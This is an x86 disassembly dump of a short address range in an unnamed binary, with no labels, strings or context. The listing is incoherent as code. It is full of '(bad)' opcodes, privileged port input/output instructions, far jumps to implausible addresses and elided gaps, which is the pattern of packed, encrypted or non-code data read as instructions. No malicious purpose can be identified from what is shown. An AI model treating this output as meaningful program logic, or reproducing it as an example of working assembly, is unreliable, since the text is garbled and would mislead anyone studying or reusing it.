  4173ff:	stc    
  417400:	jae    0x417433
  417402:	ins    DWORD PTR es:[edi],dx
  417403:	sti    
	...
  417410:	add    BYTE PTR [eax],al
  417412:	add    BYTE PTR [ebp+0x24],dl
  417415:	cs add eax,0xb900197b
  41741b:	xchg   ebx,eax
  41741c:	xor    DWORD PTR [ebp-0x25],ebp
  41741f:	jge    0x417465
  417421:	jb     0x4173ef
  417423:	inc    ecx
  417424:	xor    DWORD PTR [ebx-0x60],esp
  417427:	inc    esi
  417428:	xor    al,0x74
  41742a:	enter  0x243e,0x63
  41742e:	jmp    0xb0b39893
  417433:	xor    BYTE PTR [ecx],dh
  417435:	xor    ebx,edi
  417437:	push   es
  417438:	daa    
  417439:	ins    BYTE PTR es:[edi],dx
  41743a:	xchg   ebp,eax
  41743b:	pusha  
  41743c:	inc    esp
  41743d:	jb     0x4173df
  41743f:	nop
  417440:	xor    DWORD PTR [ebx-0x79],edx
  417443:	nop
  417444:	aaa    
  417445:	ins    DWORD PTR es:[edi],dx
  417446:	xchg   ebp,eax
  417447:	ins    DWORD PTR es:[edi],dx
  417448:	and    al,0x74
  41744a:	add    dh,dh
  41744c:	out    0x73,eax
  41744e:	popa   
  41744f:	retf   0x6
  417452:	add    dl,cl
  417454:	push   es
  417455:	add    BYTE PTR [eax],al
  417457:	mov    edx,0x70400006
  41745c:	scas   al,BYTE PTR es:[edi]
  41745d:	cmp    esp,esp
  41745f:	rol    dh,0xd
  417462:	mov    edi,0xaa012f
  417467:	and    edi,DWORD PTR [edi]
  417469:	out    dx,al
  41746a:	inc    ecx
  41746b:	push   eax
  41746c:	scas   al,BYTE PTR es:[edi]
  41746d:	cmp    esp,esp
  41746f:	loopne 0x417437
  417471:	or     eax,0xaa012fbf
	...
  417486:	and    edi,DWORD PTR [edi]
  417488:	out    dx,al
  417489:	inc    edx
  41748a:	xor    BYTE PTR [esi-0x393f1bc7],ch
  417490:	or     eax,0xaa016fbf
  417495:	add    BYTE PTR [ebx+0x3f],ah
  417498:	out    dx,al
  417499:	aas    
  41749a:	cmp    al,BYTE PTR [esi]
  41749c:	add    BYTE PTR ds:0x55affa,ah
  4174a2:	pop    ecx
  4174a3:	out    0x65,al
  4174a5:	je     0x4174dc
  4174a7:	loope  0x41751a
  4174a9:	gs push ds
  4174ab:	inc    ebp
  4174ac:	arpl   WORD PTR gs:[eax],di
  4174af:	out    0x6e,eax
  4174b1:	outs   dx,DWORD PTR ds:[esi]
  4174b2:	and    al,0xf2
  4174b4:	pop    ebx
  4174b5:	dec    ecx
  4174b6:	int3   
  4174b7:	icebp  
  4174b8:	pusha  
  4174b9:	jb     0x4174e7
  4174bb:	fnsave [ebx+0x20]
  4174be:	(bad)  
  4174bf:	(bad)  [edi+0x6c]
  4174c2:	sbb    eax,0xde7260f0
  4174c7:	call   0xa18e939
  4174cc:	ins    BYTE PTR es:[edi],dx
  4174cd:	imul   eax,DWORD PTR [edi+eiz*8],0x8f636d71
  4174d4:	dec    ebp
  4174d5:	push   ecx
  4174d6:	push   edi
  4174d7:	sub    esi,DWORD PTR [ebx]
  4174d9:	pop    edi
  4174da:	cmp    al,0x79
  4174dc:	repz (bad) 
  4174de:	mov    esp,0x4200019b
  4174e3:	pushf  
  4174e4:	and    eax,DWORD PTR [eax]
  4174e6:	inc    esi
  4174e7:	pushf  
  4174e8:	repz inc DWORD PTR [eax]
	...
  4174f7:	add    BYTE PTR [eax],al
  4174f9:	ins    BYTE PTR es:[edi],dx
  4174fa:	pushf  
  4174fb:	idiv   edi
  4174fd:	pop    ebx
  4174fe:	pushf  
  4174ff:	daa    
  417500:	add    BYTE PTR [esi-0x64],al
  417503:	in     al,dx
  417504:	inc    DWORD PTR [edx]
  417506:	pushf  
  417507:	cmc    
  417508:	dec    DWORD PTR [ebp-0x64]
  41750b:	loopne 0x41750c
  41750d:	xor    BYTE PTR [esi+eiz*1-0x13640100],bl
  417514:	(bad)  
  417515:	aas    
  417516:	pushf  
  417517:	and    al,0x0
  417519:	xor    BYTE PTR [eax+edi*8-0x1f616b01],bl
  417520:	inc    ecx
  417522:	sahf   
  417523:	repz call DWORD PTR [edx+0x74ffec9e]
  41752a:	sahf   
  41752b:	cmc    
  41752c:	inc    eax
  41752e:	sahf   
  41752f:	and    eax,DWORD PTR [eax]
  417531:	ret    0xfa9e
  417534:	inc    esi
  417536:	sahf   
  417537:	cli    
  417538:	jmp    DWORD PTR [edi+ebx*4]
  41753b:	inc    eax
  41753c:	addr16 or ah,0x22
  417540:	jno    0x4174c6
  417542:	mov    eax,0xc5b45d35
  417547:	pop    ds
  417548:	inc    edi
  417549:	jne    0x417504
  41754b:	xor    eax,0x279e495d
  417550:	je     0x4175c5
  417552:	mov    ah,0xe2
  417554:	sub    al,0x63
  417556:	mov    esp,DWORD PTR [edx]
  417558:	outs   dx,WORD PTR ds:[esi]
  41755a:	add    eax,0x249e
	...
  41756b:	add    BYTE PTR [ecx+0x22],dl
  41756e:	mov    ebx,0x89183f44
  417573:	sub    BYTE PTR [edi],ch
  417575:	inc    esp
  417576:	jle    0x417598
  417578:	cmp    BYTE PTR [eax],bl
  41757a:	xchg   ebp,eax
  41757b:	add    edx,DWORD PTR [edx]
  41757d:	push   ds
  41757e:	jae    0x4175a8
  417580:	adc    ah,BYTE PTR [edx]
  417582:	jns    0x4175bd
  417584:	inc    eax
  417585:	xor    edi,DWORD PTR [edx+0x3]
  417588:	adc    bl,BYTE PTR [esi]
  41758a:	pop    ebx
  41758b:	daa    
  41758c:	xor    ah,BYTE PTR [edx]
  41758e:	pop    ecx
  41758f:	cmp    al,BYTE PTR [eax]
  417591:	xor    eax,DWORD PTR [edi]
  417593:	out    0x0,eax
  417595:	dec    ecx
  417596:	pop    ds
  417597:	and    DWORD PTR [edx],edx
  417599:	xor    edi,esp
  41759b:	push   esp
  41759c:	add    al,0x31
  41759e:	inc    esp
  41759f:	push   ebp
  4175a0:	add    BYTE PTR [ebx],dh
  4175a2:	cmp    eax,0x3e4f127
  4175a7:	sub    BYTE PTR [edi],al
  4175a9:	push   eax
  4175aa:	or     al,0x26
  4175ac:	mov    al,0x33
  4175ae:	or     eax,DWORD PTR [edx+esi*4]
  4175b1:	push   ds
  4175b2:	sbb    esp,DWORD PTR [edi]
  4175b4:	mov    dl,0x22
  4175b6:	sbb    DWORD PTR [edx],edi
  4175b8:	shl    BYTE PTR [ebx],0xc7
  4175bb:	out    0xc0,al
  4175bd:	dec    ecx
  4175be:	sbb    DWORD PTR [edi],esp
  4175c0:	enter  0xfb18,0x26
  4175c4:	add    DWORD PTR [ecx+0x0],0x36
  4175c8:	shl    BYTE PTR [ebx+ebx*8],0x20
  4175cc:	xchg   ecx,eax
  4175cd:	cs out 0x54,eax
	...
  4175dc:	add    BYTE PTR [eax],al
  4175de:	add    BYTE PTR [ecx+esi*1-0x34],bh
  4175e2:	push   esp
  4175e3:	xor    BYTE PTR [ebx],0xd5
  4175e6:	es xchg ecx,eax
  4175e8:	in     eax,0xb
  4175ea:	sub    BYTE PTR [eax+0x52],cl
  4175ed:	mov    edx,0x57126
  4175f2:	call   0x333d:0x9a633149
  4175f9:	jbe    0x417587
  4175fb:	xchg   esi,eax
  4175fc:	in     eax,0x22
  4175fe:	test   DWORD PTR [ebp-0x69738eae],esi
  417604:	in     eax,0x4f
  417606:	mov    dh,0x60
  417608:	in     al,0x70
  41760a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41760b:	jg     0x417631
  41760d:	ja     0x417599
  41760f:	pop    eax
  417610:	dec    eax
  417611:	xchg   DWORD PTR [bx+si+0x56],esp
  417615:	addr16 jne 0x417695
  417618:	push   esi
  417619:	arpl   WORD PTR [ebx+0x59],bx
  41761c:	and    al,0x72
  41761e:	or     DWORD PTR [ebx+eiz*1+0x5c],edi
  417622:	cmp    bl,BYTE PTR [ecx]
  417624:	push   ecx
  417625:	push   eax
  417626:	jmp    0x3cad9a47
  41762b:	dec    edi
  41762c:	and    al,0x46
  41762e:	adc    eax,0x4071050f
  417633:	sub    esp,DWORD PTR [ecx+esi*2]
  417636:	(bad)  
  417637:	cmp    BYTE PTR [esp+ebp*2],bl
  41763a:	jmp    0xc9a398fa
  41763f:	pushf  
  417640:	inc    esi
  417641:	je     0x41764b
	...
  41764f:	add    BYTE PTR [eax],al
  417651:	add    BYTE PTR [edi+0x39],ah
  417654:	ins    DWORD PTR es:[edi],dx
  417655:	push   es
  417656:	push   0x802d2017
  41765b:	xor    DWORD PTR [edi-0x17],ebx
  41765e:	(bad)  
  41765f:	ss dec esp
  417661:	add    BYTE PTR [ebx+0x22],ch
  417664:	and    BYTE PTR [edi],al
  417666:	xor    BYTE PTR [ebx],0x6b
  417669:	enter  0xe554,0x30
  41766d:	jmp    0xc5a3bcbe
  417672:	inc    ebp
  417673:	add    eax,0xa729e928
  417678:	sbb    eax,0x4b420a00
  41767d:	dec    esi
  41767e:	(bad)  [esi+0x52]
  417681:	inc    ecx
  417682:	ret    
  417683:	inc    esp
  417684:	push   esp
  417685:	add    dl,cl
  417687:	push   eax
  417688:	inc    ebp
  417689:	dec    ebp
  41768a:	or     edx,DWORD PTR [ecx+0x55]
  41768d:	add    BYTE PTR [edi],cl
  41768f:	inc    ebp
  417690:	inc    ebp
  417691:	push   ecx
  417692:	cmovo  eax,DWORD PTR [eax]
  417695:	inc    ebx
  417696:	add    al,BYTE PTR [eax+0x3f]
  417699:	dec    ebx
  41769a:	retf   0x4b3c
  41769d:	push   edx
  41769e:	(bad)  
  41769f:	jmp    0x4176e3
  4176a1:	dec    esi
  4176a2:	mov    edx,0xdd6f6c02
  4176a7:	or     ebp,DWORD PTR [esi+0x73]
  4176aa:	mov    al,BYTE PTR [edi]
  4176ac:	jb     0x417717
  4176ae:	sbb    eax,0x2f5f6e08
  4176b3:	repz imul eax,DWORD PTR [eax],0x0
	...
  4176c3:	add    BYTE PTR [eax],al
  4176c5:	sub    ah,al
  4176c7:	outs   dx,BYTE PTR ds:[esi]
  4176c8:	jae    0x417707
  4176ca:	push   es
  4176cb:	jb     0x417731
  4176cd:	push   ebp
  4176ce:	out    dx,eax
  4176cf:	pop    esp
  4176d0:	ins    BYTE PTR es:[edi],dx
  4176d1:	das    
  4176d2:	fdiv   st(7),st
  4176d4:	je     0x4176ff
  4176d6:	fdiv   QWORD PTR [ecx+0x6e]
  4176d9:	imul   esp,esp,0x60
  4176dc:	pop    edi
  4176dd:	ins    BYTE PTR es:[edi],dx
  4176de:	loopne 0x41774b
  4176e0:	jne    0x417741
  4176e2:	add    DWORD PTR [esi+0x74],esp
  4176e5:	push   0xffffff9b
  4176e7:	sub    al,0x2f
  4176e9:	dec    edx
  4176ea:	or     dh,BYTE PTR [esp+esi*2+0x3a]
  4176ee:	pushf  
  4176ef:	sub    al,0x2f
  4176f1:	cmp    cl,BYTE PTR [edx]
  4176f3:	je     0x417769
  4176f5:	sub    dh,bl
  4176f7:	cmp    DWORD PTR [edi],ebp
  4176f9:	jne    0x4176fc
  4176fb:	pop    esp
  4176fc:	inc    edi
  4176fd:	and    eax,0x636c6307
  417702:	mov    ecx,0xca7b414d
  417707:	push   ds
  417708:	imul   eax,DWORD PTR [esi-0x74beb264],0x6a
  41770f:	push   ds
  417710:	imul   edi,DWORD PTR [edx+0x69],0x20
  417714:	add    BYTE PTR [edi+0x4c72195b],al
  41771a:	xchg   ecx,eax
  41771b:	sub    BYTE PTR [eax+0x47],dl
  41771e:	xchg   ecx,eax
  41771f:	xor    al,BYTE PTR [eax]
  417721:	xor    BYTE PTR [edi+0x23],bh
  417724:	je     0x417772
  417726:	jge    0x417757
  417728:	arpl   WORD PTR [eax],ax
	...
  417736:	add    BYTE PTR [eax],al
  417738:	pop    ds
  417739:	pop    ebx
  41773a:	sbb    DWORD PTR [edx+0x44],esi
  41773d:	jns    0x417767
  41773f:	push   eax
  417740:	aas    
  417741:	sub    DWORD PTR [edx],esi
  417743:	add    BYTE PTR [edx],bl
  417745:	xor    dh,BYTE PTR es:[edx+eax*1+0x50]
  41774a:	and    BYTE PTR [ebp+0x1f],bl
  41774d:	push   ebp
  41774e:	xor    al,BYTE PTR [eax]
  417750:	das    
  417751:	fidiv  DWORD PTR [ecx]
  417753:	ins    DWORD PTR es:[edi],dx
  417754:	test   BYTE PTR [edi+esi*1+0x6b],0x63
  417759:	loopne 0x417798
  41775b:	add    BYTE PTR [si+0x32],dl
  41775f:	ins    DWORD PTR es:[edi],dx
  417760:	(bad)  
  417761:	cmp    BYTE PTR [esp+ebx*2],al
  417764:	and    bh,ah
  417766:	push   ds
  417767:	ins    DWORD PTR es:[edi],dx
  417768:	(bad)  
  417769:	sti    
  41776a:	add    ebx,DWORD PTR [ecx+esi*4+0x13]
  41776e:	and    DWORD PTR [ecx-0x62],ebp
  417771:	adc    DWORD PTR [eax],esp
  417773:	je     0x4177d8
  417775:	out    0xde,eax
  417777:	dec    edx
  417778:	(bad)  
  417779:	cli    
  41777a:	es ins DWORD PTR es:[edi],dx
  41777c:	lds    ebp,FWORD PTR [esi-0x1681b6b3]
  417782:	es ins BYTE PTR es:[edi],dx
  417784:	mov    esi,0xbf001ba3
  417789:	add    eax,0x2b8631b7
  41778e:	rcr    BYTE PTR [edi],1
  417790:	sbb    BYTE PTR [eax],0xe7
  417793:	dec    eax
  417794:	xchg   ebx,eax
  417795:	cs retf 0x9f03
  417799:	dec    edx
  41779a:	mov    bh,0x1c
	...
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	add    BYTE PTR [edx-0x7bcc5bbf],al
  4177b0:	sub    bh,ah
  4177b2:	push   edx
  4177b3:	outs   dx,DWORD PTR ds:[esi]
  4177b4:	lds    esp,FWORD PTR es:0x53bb4b88
  4177bb:	arpl   WORD PTR [eax],bx
  4177bd:	nop
  4177be:	aaa    
  4177bf:	inc    eax
  4177c0:	sbb    ch,al
  4177c2:	sbb    al,0x35
  4177c4:	cs out 0x4f,eax
  4177c7:	adc    ch,BYTE PTR [esi]
  4177c9:	jnp    0x4177f3
  4177cb:	xor    al,BYTE PTR ds:0x1844559b
  4177d1:	and    BYTE PTR [edx],0x36
  4177d4:	xor    al,bh
  4177d6:	inc    eax
  4177d7:	add    BYTE PTR [ecx],ch
  4177d9:	push   eax
  4177da:	and    esp,DWORD PTR [ebx-0xd]
  4177dd:	inc    esp
  4177de:	cmp    BYTE PTR [ebx],dl
  4177e0:	add    eax,0x500043a
  4177e5:	push   ebx
  4177e6:	add    al,0xf7
  4177e8:	add    al,0x50
  4177ea:	add    al,0x5
  4177ec:	add    eax,0x4f20446
  4177f1:	out    0x3,eax
  4177f3:	pop    es
  4177f4:	dec    esp
  4177f5:	cmp    ebx,DWORD PTR ds:0xe41326c1
  4177fb:	mov    al,ds:0xbf1e1634
  417800:	xor    al,0x8
  417802:	sub    al,al
  417804:	pop    ss
  417805:	out    0x50,eax
  417807:	test   al,0xf3
  417809:	pop    es
  41780a:	xor    al,dl
  41780c:	sub    eax,0x45e7
	...
  41781d:	add    BYTE PTR [ecx+0x48fa002a],dh
  417823:	dec    ebx
  417824:	push   esp
  417825:	sbb    DWORD PTR [edi-0xd],esp
  417828:	push   eax
  417829:	mov    ah,0x9e
  41782b:	add    eax,0x1f41cd42
  417830:	arpl   WORD PTR [edi-0x25ffeab4],bp
  417836:	pop    ecx
  417837:	sbb    DWORD PTR [ebx+0x17],esp
  41783a:	dec    ebx
  41783b:	inc    esp
  41783c:	je     0x417827
  41783e:	sub    al,0x44
  417840:	jno    0x4177ff
  417842:	nop
  417843:	inc    esp
  417844:	jno    0x417800
  417846:	xchg   edi,eax
  417847:	xor    dh,BYTE PTR [edx-0x73]
  41784a:	pusha  
  41784b:	push   ecx
  41784c:	pop    edi
  41784d:	call   0x2892:0x8d63e494
  417854:	jno    0x4177f0
  417856:	pusha  
  417857:	push   ecx
  417858:	pop    edi
  417859:	jp     0x4178c7
  41785b:	cmp    BYTE PTR [ecx-0x7c],dh
  41785e:	jb     0x417865
  417860:	dec    esp
  417861:	mov    BYTE PTR [ebx+0x19],dh
  417864:	push   eax
  417865:	jle    0x4178b9
  417867:	sbb    DWORD PTR [eax],eax
  417869:	cmp    dh,BYTE PTR [esi+0x2b]
  41786c:	je     0x4178c4
  41786e:	inc    eax
  41786f:	pop    ss
  417870:	arpl   WORD PTR ds:0x5a5f311d,si
  417876:	pop    edi
  417877:	xor    eax,0x415a4863
  41787c:	inc    edx
  41787d:	dec    ebp
  41787e:	inc    eax
  41787f:	pop    ds
  417880:	arpl   WORD PTR [edi],bp
	...
  41788e:	add    BYTE PTR [eax],al
  417890:	add    BYTE PTR [ebx],ch
  417892:	adc    eax,0x19841a5c
  417897:	je     0x4178a9
  417899:	jne    0x4178c3
  41789b:	jno    0x417886
  41789d:	pushf  
  41789e:	inc    edi
  41789f:	ins    BYTE PTR es:[edi],dx
  4178a0:	or     BYTE PTR [ecx+0x26],bh
  4178a3:	inc    esi
  4178a4:	adc    eax,0x2e0577
  4178a9:	fldcw  WORD PTR fs:[ebx+0x0]
  4178ad:	test   BYTE PTR ds:0xc1212b50,bh
  4178b3:	dec    ecx
  4178b4:	imul   ebx,DWORD PTR [esi+edi*8],0xec32735b
  4178bb:	imul   ebp,DWORD PTR [esi+ecx*8+0x1],0x70
  4178c0:	gs sbb al,0x53
  4178c3:	pop    edi
  4178c4:	outs   dx,DWORD PTR ds:[esi]
  4178c5:	mov    edi,0x266e5d03
  4178ca:	pop    es
  4178cb:	inc    ebx
  4178cc:	outs   dx,DWORD PTR ds:[esi]
  4178cd:	les    edi,FWORD PTR [edx]
  4178cf:	push   eax
  4178d0:	add    BYTE PTR [ecx-0x589191ff],bh
  4178d6:	in     eax,0x73
  4178d8:	imul   ebp,ebp,0xf62e6f00
  4178de:	out    dx,al
  4178df:	jae    0x4178e1
  4178e1:	test   eax,0xf646294a
  4178e6:	add    BYTE PTR ss:[ebx-0x2d],dh
  4178ea:	fisub  DWORD PTR [eax+0x73]
  4178ed:	pushf  
  4178ee:	jmp    FWORD PTR [ebp+0x69]
  4178f1:	mov    edx,0x442f52
	...
  417902:	add    BYTE PTR [eax],al
  417904:	fisttp WORD PTR [eax+0x54]
  417907:	push   eax
  417908:	mov    cl,BYTE PTR [edx+0x4f]
  41790b:	imul   esi,DWORD PTR [esi],0x296543e4
  417911:	add    BYTE PTR [ebx+0x6e],ah
  417914:	daa    
  417915:	(bad)  
  417917:	push   edx
  417918:	sub    eax,0x3b575447
  41791d:	cmp    eax,DWORD PTR [ecx+0x5c]
  417920:	cmp    ebp,edi
  417922:	pop    esp
  417923:	jae    0x4178be
  417925:	in     al,0x6e
  417927:	pop    esp
  417928:	xchg   esi,eax
  417929:	lock outs dx,DWORD PTR ds:[esi]
  41792b:	gs jle 0x41792e
  41792e:	bound  ebx,QWORD PTR [ebx+eiz*2-0x9]
  417932:	inc    ecx
  417933:	aaa    
  417934:	jae    0x4178ee
  417936:	test   BYTE PTR [eax+0x7b],0xc4
  41793a:	fadd   DWORD PTR [ebp+0x75]
  41793d:	jmp    0x3ef4:0x5c722af5
  417944:	dec    esi
  417945:	in     eax,dx
  417946:	hlt    
  417947:	inc    eax
  417948:	pop    edx
  417949:	stc    
  41794a:	repz aaa 
  41794c:	push   ebx
  41794d:	cld    
  41794e:	cmc    
  41794f:	inc    ecx
  417950:	push   ecx
  417951:	jb     0x417940
  417953:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  417955:	outs   dx,BYTE PTR ds:[esi]
  417956:	sub    BYTE PTR [edx+esi*1-0x6],bl
  41795a:	cmc    
  41795b:	pop    ebx
  41795c:	xor    eax,DWORD PTR [eax-0x608a98ce]
  417962:	repz jmp DWORD PTR [edi]
  417965:	int    0x36
  417967:	ja     0x417969
	...
  417975:	add    BYTE PTR [eax],al
  417977:	sbb    eax,0x2f005160
  41797c:	jb     0x41799e
  41797e:	je     0x4179b0
  417980:	lea    esi,[ebx]
  417982:	pop    edi
  417983:	dec    ebp
  417984:	mov    eax,DWORD PTR [ecx]
  417986:	cmp    edx,DWORD PTR cs:[edx+0x1e7d0031]
  41798d:	sbb    eax,0x40806370
  417992:	push   edx
  417993:	cs jg  0x4179e9
  417996:	push   esi
  417997:	inc    esp
  417998:	test   BYTE PTR [ebx],0x70
  41799b:	add    bh,BYTE PTR [edi]
  41799d:	xor    eax,0x203df475
  4179a2:	and    BYTE PTR [esi],dh
  4179a4:	std    
  4179a5:	in     eax,dx
  4179a6:	popa   
  4179a7:	cmp    DWORD PTR [eax+esi*1+0x19de0671],ebp
  4179ae:	pop    edi
  4179af:	not    BYTE PTR [eax-0x12]
  4179b2:	jo     0x41794d
  4179b4:	scas   al,BYTE PTR es:[edi]
  4179b5:	pop    ds
  4179b6:	jae    0x41797f
  4179b8:	add    eax,0x29ade413
  4179bd:	add    esi,DWORD PTR [esi]
  4179bf:	rcl    BYTE PTR [edx+ebx*1],0xee
  4179c3:	mov    bl,0xdb
  4179c5:	out    0xd9,al
  4179c7:	xor    al,0x35
  4179c9:	sub    al,0x56
  4179cb:	cwde   
  4179cc:	xor    al,0x19
  4179ce:	push   edx
  4179cf:	jbe    0x4179d6
  4179d1:	sub    eax,0x1ce5b350
  4179d6:	sbb    ecx,DWORD PTR [esi+0x4fad05]
	...
  4179e8:	add    BYTE PTR [eax],al
  4179ea:	mov    bl,0x4f
  4179ec:	into   
  4179ed:	xor    ah,BYTE PTR [ebx+0x14]
  4179f0:	shr    BYTE PTR [edi],0x80
  4179f3:	adc    al,0xfd
  4179f5:	sub    ecx,DWORD PTR [eax-0x61a918cf]
  4179fb:	inc    edi
  4179fc:	xchg   ebx,eax
  4179fd:	push   edx
  4179fe:	and    al,0x33
  417a00:	lods   al,BYTE PTR ds:[esi]
  417a01:	inc    edi
  417a02:	xor    DWORD PTR [eax],esi
  417a04:	leave  
  417a05:	sbb    cl,BYTE PTR [eax-0x7cac44b9]
  417a0b:	aam    0xcc
  417a0d:	repnz sub BYTE PTR [edx+ecx*4],dh
  417a11:	xor    eax,0x36931544
  417a16:	arpl   WORD PTR [esi+esi*4],si
  417a19:	inc    ecx
  417a1a:	pop    ss
  417a1b:	cmp    BYTE PTR [eax-0x66bedfab],ch
  417a21:	sbb    al,BYTE PTR [ecx]
  417a23:	xor    BYTE PTR [ecx+eax*2-0xaf8cad1],bh
  417a2a:	fdivr  DWORD PTR ds:[edx]
  417a2d:	inc    edx
  417a2e:	das    
  417a2f:	xor    eax,0x16f11f3a
  417a34:	inc    esp
  417a35:	ss repnz add al,0x2d
  417a39:	push   eax
  417a3a:	adc    esp,ebp
  417a3c:	sub    DWORD PTR [ecx],ebx
  417a3e:	lock add BYTE PTR cs:0x19544767,bh
  417a46:	aas    
  417a47:	dec    edx
  417a48:	addr16 adc eax,0xe963e46c
	...
  417a5a:	add    BYTE PTR [eax],al
  417a5c:	add    BYTE PTR [eax+0x721a7140],dh
  417a62:	xor    dh,BYTE PTR [edx+0x5]
  417a65:	pop    edi
  417a66:	ss arpl bx,di
  417a69:	jb     0x417a8f
  417a6b:	jb     0x417a9c
  417a6d:	sub    BYTE PTR [ebx+eiz*2],0xe9
  417a71:	lods   eax,DWORD PTR ds:[esi]
  417a72:	push   ss
  417a73:	arpl   bx,di
  417a75:	pop    ecx
  417a76:	dec    ecx
  417a77:	add    BYTE PTR [eax-0x2f8bd796],dh
  417a7d:	inc    ecx
  417a7e:	xor    DWORD PTR [eax+eax*8+0x36],eax
  417a82:	and    al,0x61
  417a84:	aad    0x5b
  417a86:	adc    esi,DWORD PTR [edi-0x17]
  417a89:	nop
  417a8a:	xor    dh,BYTE PTR [edx-0x4b]
  417a8d:	sub    dl,BYTE PTR [ebx+ebp*2]
  417a90:	retf   
  417a91:	jge    0x417aa6
  417a93:	add    BYTE PTR [edx-0x7389ec8b],bl
  417a99:	xchg   esi,eax
  417a9a:	cmp    DWORD PTR [edi-0x67],esi
  417a9d:	gs add eax,0x560e910
  417aa3:	test   DWORD PTR [esi-0x7395fadf],esp
  417aa9:	rcr    DWORD PTR [ebx],1
  417aab:	jg     0x417a53
  417aad:	ins    BYTE PTR es:[edi],dx
  417aae:	repnz mov ch,0x10
  417ab1:	bound  esp,QWORD PTR [ebp-0x8]
  417ab4:	add    al,0xae
  417ab6:	es dec ebx
  417ab8:	inc    eax
  417ab9:	shr    DWORD PTR [di],cl
  417abc:	adc    al,0xa9
  417abe:	aad    0x36
  417ac0:	pop    es
	...
  417acd:	add    BYTE PTR [eax],al
  417acf:	add    BYTE PTR [esi-0x28],dh
  417ad2:	call   FWORD PTR [eax]
  417ad4:	jne    0x417adf
  417ad6:	or     BYTE PTR [eax],al
  417ad8:	push   ecx
  417ad9:	add    edi,ebp
  417adb:	add    al,0x7f
  417add:	add    al,0xff
  417adf:	add    cl,BYTE PTR [edx+0x3a]
  417ae2:	imul   esp,DWORD PTR [esi-0x72],0xffffffd4
  417ae6:	pop    esp
  417ae7:	jb     0x417b48
  417ae9:	dec    ebp
  417aea:	dec    esp
  417aeb:	imul   edx,DWORD PTR [edx+eiz*8+0x6e],0x5c397e46
  417af3:	push   ebx
  417af4:	arpl   bp,dx
  417af6:	pusha  
  417af7:	and    BYTE PTR [edi-0x1e],dh
  417afa:	ins    DWORD PTR es:[edi],dx
  417afb:	popa   
  417afc:	pop    ebp
  417afd:	(bad)  
  417afe:	jno    0x417b00
  417b00:	inc    edx
  417b01:	cld    
  417b02:	outs   dx,BYTE PTR ds:[esi]
  417b03:	je     0x417b0f
  417b05:	push   eax
  417b06:	outs   dx,DWORD PTR ds:[esi]
  417b07:	sub    BYTE PTR gs:[ebx],al
  417b0a:	push   eax
  417b0b:	popa   
  417b0c:	sub    edx,ebx
  417b0e:	dec    DWORD PTR [edi+0x25]
  417b11:	fnstenv [ebx+0x0]
  417b14:	mov    eax,0xae6f68ff
  417b19:	call   FWORD PTR [edi]
  417b1b:	inc    esp
  417b1c:	adc    ebx,ecx
  417b1e:	call   FWORD PTR [ebx+0x9]
  417b21:	in     al,dx
  417b22:	popa   
  417b23:	gs sbb bh,bh
  417b26:	jo     0x417b8b
  417b28:	icebp  
  417b29:	add    ch,BYTE PTR [esi]
  417b2b:	fs out dx,eax
  417b2d:	jmp    0xda207b98
  417b32:	pusha  
  417b33:	jb     0x417b35
	...
  417b41:	add    BYTE PTR [eax],al
  417b43:	hlt    
  417b44:	jmp    0xfc1de9b3
  417b49:	bound  eax,QWORD PTR [eax]
  417b4b:	out    0xd9,al
  417b4d:	pusha  
  417b4e:	je     0x417b6e
  417b50:	sti    
  417b51:	ins    DWORD PTR es:[edi],dx
  417b52:	stos   BYTE PTR es:[di],al
  417b54:	cld    
  417b55:	pop    esp
  417b56:	ins    DWORD PTR es:[edi],dx
  417b57:	pop    ds
  417b58:	lods   al,BYTE PTR ds:[esi]
  417b59:	pop    ds
  417b5a:	add    BYTE PTR [eax+0x9],bl
  417b5d:	jbe    0x417bc0
  417b5f:	arpl   WORD PTR [eax+0x2f],cx
  417b62:	arpl   WORD PTR [esi],si
  417b64:	or     al,BYTE PTR [ecx+edx*2]
  417b67:	cld    
  417b68:	dec    ebp
  417b69:	xor    BYTE PTR [ebp+0x2],dh
  417b6c:	ficomp DWORD PTR [esi]
  417b6e:	pop    esp
  417b6f:	mov    al,0x45
  417b71:	pop    ss
  417b72:	ins    DWORD PTR es:[edi],dx
  417b73:	(bad)  
  417b76:	je     0x417b33
  417b78:	or     eax,0xf9b35c17
  417b7d:	dec    edi
  417b7e:	push   esp
  417b7f:	call   0x1afb:0xb06350d8
  417b86:	ins    DWORD PTR es:[edi],dx
  417b87:	mov    ebp,0xb448019b
  417b8c:	fwait
  417b8d:	sub    eax,0x1f09824e
  417b92:	add    BYTE PTR [esi-0x628ddf65],ch
  417b98:	int    0x18
  417b9a:	arpl   WORD PTR [ebx+0x5c],sp
  417b9d:	and    al,0x71
  417b9f:	jo     0x417b60
  417ba1:	push   ss
  417ba2:	jb     0x417c23
  417ba4:	lods   al,BYTE PTR ds:[esi]
  417ba5:	push   ecx
  417ba6:	ins    DWORD PTR es:[edi],dx
	...
  417bb3:	add    BYTE PTR [eax],al
  417bb5:	add    BYTE PTR [ecx+0x60],dh
  417bb8:	xor    esi,DWORD PTR [ebx+0x76]
  417bbb:	retf   0x7220
  417bbe:	arpl   WORD PTR [eax-0x3ab98de0],ax
  417bc4:	adc    ebx,DWORD PTR [edi+0x3f]
  417bc7:	pusha  
  417bc8:	sub    al,0x70
  417bca:	lods   al,BYTE PTR ds:[esi]
  417bcc:	xor    esi,DWORD PTR [eax+0x33]
  417bcf:	outs   dx,BYTE PTR ds:[esi]
  417bd0:	dec    ebp
  417bd1:	push   eax
  417bd2:	test   DWORD PTR [eax+ebx*1+0x6c],esi
  417bd6:	arpl   WORD PTR [eax+0x33],bp
  417bd9:	ins    DWORD PTR es:[edi],dx
  417bda:	das    
  417bdb:	mov    DWORD PTR [ecx],esi
  417bdd:	pop    edi
  417bde:	pop    es
  417bdf:	ret    
  417be0:	(bad)  
  417be2:	xor    DWORD PTR [edi],ebx
  417be4:	sbb    esi,DWORD PTR [esp+edx*1+0x5]
  417be8:	dec    eax
  417be9:	xor    al,BYTE PTR [eax]
  417beb:	inc    ecx
  417bec:	sub    dl,BYTE PTR [edi]
  417bee:	add    eax,0x22214c27
  417bf3:	sbb    BYTE PTR [edi-0x1c],dl
  417bf6:	adc    ebp,DWORD PTR [esi]
  417bf8:	dec    ebp
  417bf9:	xor    dh,ch
  417bfb:	and    edi,DWORD PTR [ecx]
  417bfd:	and    DWORD PTR [ebx+0x43],esp
  417c00:	sbb    edx,DWORD PTR [ebx+eax*4+0x21]
  417c04:	inc    esp
  417c05:	xor    edx,edi
